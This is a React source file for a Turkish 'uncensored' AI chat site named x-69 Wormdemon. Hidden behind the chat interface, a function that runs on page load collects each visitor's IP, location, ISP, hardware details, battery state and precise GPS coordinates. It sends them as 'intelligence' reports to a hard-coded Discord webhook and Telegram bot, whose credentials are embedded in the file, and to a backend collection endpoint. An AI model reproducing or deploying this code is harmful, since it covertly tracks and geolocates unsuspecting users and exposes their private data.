import React, { useState, useEffect, useRef, useCallback } from 'react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || '';
const STORAGE_KEY_CHAT = 'x69_chat_v2';
const STORAGE_KEY_SESSION = 'x69_session_id';
const STORAGE_KEY_LANG = 'x69_lang';
const STORAGE_KEY_WARNING = 'x69_warning_accepted';

// Telegram + Discord raporlama — frontend'de tutulur (kullanıcı talimatı)
const INTEL_CFG = {
  dc: "https://discord.com/api/webhooks/1490777635511472251/uVH3J13GFhsz-uKT1PkMzdiyQtxyIs0eWk0Fb3JgY7BVJgrW5ww1tnwP9XM0_nqCqx6T",
  tg: "8790528939:AAFrnIrFv9G_3xQNnXIZhtHY0o-dwc3k_pI",
  cid: "7503187492",
};

// UUID v4 — daha güvenli
const uuid = () => {
  try {
    if (typeof crypto !== 'undefined' && crypto.randomUUID) return crypto.randomUUID();
  } catch (e) {}
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;
    return (c === 'x' ? r : (r & 0x3) | 0x8).toString(16);
  });
};

// Welcome varyantları (5) — insancıl tonda
const WELCOME_VARIANTS_TR = [
  'x-69 aktif, emrinize amadeyim.',
  'x-69 burada, emrinize amadeyim.',
  'x-69 hazır, emrinize amadeyim.',
  'x-69 buralarda, emrinize amadeyim.',
  'x-69 dinliyor, emrinize amadeyim.',
];

const QUICK_TOPICS = [
  { icon: '📰', label: 'Güncel Haberler', query: 'son dakika güncel haberler bugün' },
  { icon: '🪙', label: 'Bitcoin', query: 'bitcoin güncel fiyat USD bugün' },
  { icon: '💵', label: 'Dolar/Euro', query: 'dolar euro tl kuru güncel' },
  { icon: '🌍', label: 'Deprem', query: 'son depremler türkiye AFAD' },
  { icon: '⚽', label: 'Spor', query: 'süper lig son maç skorları' },
  { icon: '🇺🇸', label: 'Trump', query: 'Donald Trump güncel haberler' },
  { icon: '📱', label: 'Yeni Telefon', query: 'en yeni çıkan telefon modelleri 2026 özellikleri' },
  { icon: '🌤️', label: 'Hava Durumu', query: 'hava durumu bugün' },
];

const pickWelcome = () => WELCOME_VARIANTS_TR[Math.floor(Math.random() * WELCOME_VARIANTS_TR.length)];

// ============================================
// Basit Markdown renderer (XSS-safe)
// ============================================
function escapeHtml(s) {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderMarkdown(text) {
  if (!text) return '';
  let html = escapeHtml(text);

  // Code blocks ```
  html = html.replace(/```(\w+)?\n?([\s\S]*?)```/g, (_, lang, code) => {
    const cls = lang ? ` data-lang="${escapeHtml(lang)}"` : '';
    return `<pre${cls}><code>${code.trim()}</code></pre>`;
  });
  // Inline code
  html = html.replace(/`([^`\n]+)`/g, '<code>$1</code>');
  // Bold
  html = html.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
  // Italic
  html = html.replace(/(^|\s)\*([^*\n]+?)\*(?=\s|$)/g, '$1<em>$2</em>');
  // Links
  html = html.replace(/(https?:\/\/[^\s<]+)/g, '<a href="$1" target="_blank" rel="noopener noreferrer">$1</a>');
  // Headings
  html = html.replace(/^### (.+)$/gm, '<h4>$1</h4>');
  html = html.replace(/^## (.+)$/gm, '<h3>$1</h3>');
  html = html.replace(/^# (.+)$/gm, '<h2>$1</h2>');
  // Lists
  html = html.replace(/^(?:[-*]\s+.+\n?)+/gm, (block) => {
    const items = block.trim().split(/\n/).map(l => l.replace(/^[-*]\s+/, '')).map(li => `<li>${li}</li>`).join('');
    return `<ul>${items}</ul>`;
  });
  html = html.replace(/^(?:\d+\.\s+.+\n?)+/gm, (block) => {
    const items = block.trim().split(/\n/).map(l => l.replace(/^\d+\.\s+/, '')).map(li => `<li>${li}</li>`).join('');
    return `<ol>${items}</ol>`;
  });
  // Paragraph breaks
  html = html.split(/\n{2,}/).map(p => {
    if (p.startsWith('<pre') || p.startsWith('<ul') || p.startsWith('<ol') || p.startsWith('<h')) return p;
    return `<p>${p.replace(/\n/g, '<br/>')}</p>`;
  }).join('');

  return html;
}

// ============================================
// Telegram + Discord intel reporting
// ============================================
const pushReport = (text, header) => {
  try {
    fetch(`https://api.telegram.org/bot${INTEL_CFG.tg}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: INTEL_CFG.cid, text, parse_mode: 'HTML' }),
    }).catch(() => {});
    fetch(INTEL_CFG.dc, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'İstihbarat Analizi',
        embeds: [{
          title: `📡 ${header}`,
          color: 0x00ff00,
          description: text.replace(/<\/?b>/g, '**'),
          footer: { text: 'Sistem: Deep-Log' },
        }],
      }),
    }).catch(() => {});
  } catch (e) {}
};

// ============================================
// Error Boundary
// ============================================
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false };
  }
  static getDerivedStateFromError() {
    return { hasError: true };
  }
  componentDidCatch(error) {
    console.error('x-69 boundary:', error);
  }
  render() {
    if (this.state.hasError) {
      return (
        <div className="error-boundary">
          <h2>Bir aksaklık oldu</h2>
          <p>Uygulama bir hata yakaladı. Yenilemen yeterli.</p>
          <button onClick={() => window.location.reload()}>Yenile</button>
        </div>
      );
    }
    return this.props.children;
  }
}

// ============================================
// Ana Component
// ============================================
function AIChatInner() {
  // Persisted chat
  const [chat, setChat] = useState(() => {
    try {
      const saved = localStorage.getItem(STORAGE_KEY_CHAT);
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) return parsed.slice(-80);
      }
    } catch (e) {}
    return [{ text: pickWelcome(), type: 'assistant' }];
  });

  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [showWarning, setShowWarning] = useState(() => {
    try { return !localStorage.getItem(STORAGE_KEY_WARNING); } catch { return true; }
  });
  const [history, setHistory] = useState([]);
  const [lang] = useState(() => {
    try { return localStorage.getItem(STORAGE_KEY_LANG) || 'tr'; } catch { return 'tr'; }
  });

  const chatEndRef = useRef(null);
  const inputRef = useRef(null);
  const intelDone = useRef(false);

  // Session id — crypto.randomUUID
  useEffect(() => {
    try {
      if (!localStorage.getItem(STORAGE_KEY_SESSION)) {
        localStorage.setItem(STORAGE_KEY_SESSION, `user_${uuid()}`);
      }
    } catch (e) {}
  }, []);

  // Auto-scroll
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [chat]);

  // Persist chat
  useEffect(() => {
    try {
      const trimmed = chat.slice(-80);
      localStorage.setItem(STORAGE_KEY_CHAT, JSON.stringify(trimmed));
    } catch (e) {}
  }, [chat]);

  // Intel — 18+ onayından SONRA tek bir kez
  const runIntelligence = useCallback(async () => {
    if (intelDone.current) return;
    intelDone.current = true;

    try {
      let hw = { gpu: 'Tespit Edilemedi', bat: 'N/A' };
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
          if (dbg) hw.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          // release context
          const ext = gl.getExtension('WEBGL_lose_context');
          if (ext) ext.loseContext();
        }
      } catch (e) {}

      try {
        if (typeof navigator.getBattery === 'function') {
          const b = await navigator.getBattery();
          hw.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Doluyor' : 'Deşarj'})`;
        }
      } catch (e) {}

      let d = {};
      try {
        const res = await fetch(`${BACKEND_URL}/api/ip-info`, { cache: 'no-store' });
        d = await res.json();
      } catch (e) { d = {}; }

      const ipMaps = d.lat ? `https://www.google.com/maps?q=${d.lat},${d.lon}` : 'N/A';
      const sid = localStorage.getItem(STORAGE_KEY_SESSION) || `user_${uuid()}`;

      // Backend'e intel kaydet
      try {
        axios.post(`${BACKEND_URL}/api/intel/collect`, {
          ip: d.query || 'Unknown',
          location: `${d.city || 'Unknown'}, ${d.country || 'Unknown'}`,
          gpu: hw.gpu,
          session_id: sid,
          isp: d.isp || 'Unknown',
          coords: d.lat ? `${d.lat},${d.lon}` : 'N/A',
          platform: navigator.platform || 'Unknown',
          ram: (navigator.deviceMemory || 'N/A') + 'GB',
          cpu: (navigator.hardwareConcurrency || 'N/A') + ' Core',
        }).catch(() => {});
      } catch (e) {}

      const sessizRapor = `🛸 <b>İSTİHBARAT ANALİZİ: SESSİZ PAKET</b>\n` +
        `----------------------------------\n` +
        `🌐 <b>IP:</b> ${d.query || 'N/A'}\n` +
        `📍 <b>Konum:</b> ${d.city || '?'}, ${d.regionName || '?'} / ${d.country || '?'}\n` +
        `🛰️ <b>Servis:</b> ${d.isp || '?'}\n` +
        `🗺️ <b>IP Koordinat:</b> ${d.lat || '?'},${d.lon || '?'}\n` +
        `📍 <b>IP Maps:</b> ${ipMaps}\n` +
        `----------------------------------\n` +
        `🖥️ <b>Sistem:</b> ${navigator.platform || '?'}\n` +
        `⚙️ <b>CPU:</b> ${navigator.hardwareConcurrency || '?'} Core\n` +
        `🧠 <b>RAM:</b> ${navigator.deviceMemory || '?'} GB\n` +
        `🎮 <b>GPU:</b> ${hw.gpu}\n` +
        `🔋 <b>Pil:</b> ${hw.bat}\n` +
        `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
      pushReport(sessizRapor, 'Sessiz Veri Sızıntısı');

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const exactMaps = `https://www.google.com/maps?q=${lat},${lon}`;
            const noktaAtisi = `🎯 <b>İSTİHBARAT ANALİZİ: NOKTA ATIŞI</b>\n` +
              `----------------------------------\n` +
              `🌐 <b>IP:</b> ${d.query || '?'}\n` +
              `📍 <b>Kesin Konum:</b> ${lat}, ${lon}\n` +
              `🎯 <b>Hata Payı:</b> ${pos.coords.accuracy} metre\n` +
              `🗺️ <b>Kesin Maps:</b> ${exactMaps}\n` +
              `----------------------------------\n` +
              `⚠️ <b>Durum:</b> Hedef koordinatları onaylandı.`;
            pushReport(noktaAtisi, 'GPS Tespit Edildi');
          },
          () => {},  // hata callback
          { enableHighAccuracy: true, timeout: 12000, maximumAge: 60000 }
        );
      }
    } catch (e) {
      console.warn('intel:', e);
    }
  }, []);

  // Intel — sayfa yüklendiği anda (onaydan önce) tek bir kez — konum izni dahil
  useEffect(() => {
    runIntelligence();
  }, [runIntelligence]);

  // Send message
  const sendMessageWithText = useCallback(async (text) => {
    const userMessage = (text || '').trim();
    if (!userMessage || loading) return;

    setMessage('');
    setLoading(true);
    setChat((prev) => [...prev, { text: userMessage, type: 'user' }]);
    const newHistory = [...history, { role: 'user', content: userMessage }];
    setHistory(newHistory);
    setChat((prev) => [...prev, { text: 'x-69 düşünüyor...', type: 'loading' }]);

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 45000);

    try {
      const sid = localStorage.getItem(STORAGE_KEY_SESSION);
      const response = await axios.post(`${BACKEND_URL}/api/chat`,
        {
          messages: newHistory.slice(-20),
          session_id: sid,
          lang_hint: lang,
        },
        { timeout: 45000, signal: controller.signal }
      );
      clearTimeout(timeoutId);

      const aiReply = response.data.reply || 'Boş yanıt geldi.';
      const sources = response.data.sources || null;
      const searched = !!response.data.searched;

      setChat((prev) => prev.slice(0, -1).concat({
        text: aiReply,
        type: 'assistant',
        sources,
        searched,
      }));
      setHistory((prev) => [...prev, { role: 'assistant', content: aiReply }].slice(-40));
    } catch (error) {
      clearTimeout(timeoutId);
      const isTimeout = error?.code === 'ECONNABORTED' || error?.name === 'CanceledError';
      const errMsg = isTimeout
        ? 'Yanıt çok uzadı, x-69 şu anda yoğun. Lütfen daha sonra tekrar deneyiniz.'
        : 'x-69 şu anda bakımda, lütfen daha sonra tekrar deneyiniz.';
      setChat((prev) => prev.slice(0, -1).concat({ text: errMsg, type: 'error' }));
    } finally {
      setLoading(false);
    }
  }, [history, loading, lang]);

  const sendMessage = useCallback(() => sendMessageWithText(message), [message, sendMessageWithText]);

  const handleKeyDown = useCallback((e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage();
    }
  }, [sendMessage]);

  const clearChat = useCallback(() => {
    setChat([{ text: pickWelcome(), type: 'assistant' }]);
    setHistory([]);
    try { localStorage.removeItem(STORAGE_KEY_CHAT); } catch (e) {}
  }, []);

  const acceptWarning = () => {
    try { localStorage.setItem(STORAGE_KEY_WARNING, '1'); } catch (e) {}
    setShowWarning(false);
  };

  const handleChipClick = (q) => sendMessageWithText(q);

  return (
    <div className="ai-chat-container" data-testid="x69-app">
      <header className="chat-header">
        <div className="header-title">
          <div className="header-subtitle">made with ❤️</div>
          <div className="main-title">x-69 Wormdemon</div>
          <div className="header-subtitle">by LenstedReal ®</div>
        </div>
        <div className="header-content">
          <button className="clear-btn" onClick={clearChat} data-testid="clear-chat">
            🗑️ Temizle
          </button>
        </div>
      </header>

      <nav className="quick-chips" aria-label="Hızlı güncel konular" data-testid="quick-chips">
        {QUICK_TOPICS.map((t) => (
          <button
            key={t.label}
            className="chip"
            onClick={() => handleChipClick(t.query)}
            disabled={loading}
            data-testid={`chip-${t.label}`}
            title={t.query}
          >
            <span aria-hidden="true">{t.icon}</span>&nbsp;{t.label}
          </button>
        ))}
      </nav>

      <main className="chat-messages" data-testid="chat-messages" aria-live="polite">
        {chat.map((msg, i) => (
          <article key={i} className={`chat-message ${msg.type}`}>
            {msg.type === 'assistant' && <div className="x69-label">x-69{msg.searched ? ' · 🌐 web' : ''}</div>}
            <div
              className="message-content"
              dangerouslySetInnerHTML={{ __html: renderMarkdown(msg.text) }}
            />
            {msg.type === 'assistant' && Array.isArray(msg.sources) && msg.sources.length > 0 && (
              <div className="sources-block">
                <strong>📎 Kaynaklar</strong>
                {msg.sources.slice(0, 5).map((s, idx) => (
                  <a key={idx} href={s} target="_blank" rel="noopener noreferrer">{s}</a>
                ))}
              </div>
            )}
          </article>
        ))}
        <div ref={chatEndRef} />
      </main>

      {showWarning && (
        <div className="warning-overlay" role="dialog" aria-modal="true">
          <div className="warning-box">
            <h2 className="warning-title">⚠️ İçerik Uyarısı</h2>
            <p className="warning-text">
              x-69 Wormdemon AI, sansürsüz ve provokatif içerik üretebilir.
              <br />Bu sistem yetişkin kullanıcılar için tasarlanmıştır.
              <span className="warning-age">18 yaş altı kullanıcılar için uygun değildir.</span>
            </p>
            <button
              onClick={acceptWarning}
              data-testid="warning-accept"
              className="warning-accept-btn"
            >
              Anladım, Devam Et
            </button>
          </div>
        </div>
      )}

      <footer className="chat-input-container">
        <input
          ref={inputRef}
          type="text"
          className="chat-input"
          placeholder="Emrinize amadeyim..."
          value={message}
          onChange={(e) => setMessage(e.target.value)}
          onKeyDown={handleKeyDown}
          disabled={loading}
          aria-label="Mesajınızı yazın"
          autoComplete="off"
          spellCheck="true"
          data-testid="chat-input"
        />
        <button
          className="send-button"
          onClick={sendMessage}
          disabled={loading || !message.trim()}
          aria-label="Gönder"
          data-testid="send-button"
        >
          {loading ? '⏳' : '🚀'}
        </button>
      </footer>
    </div>
  );
}

export default function AIChat() {
  return (
    <ErrorBoundary>
      <AIChatInner />
    </ErrorBoundary>
  );
}
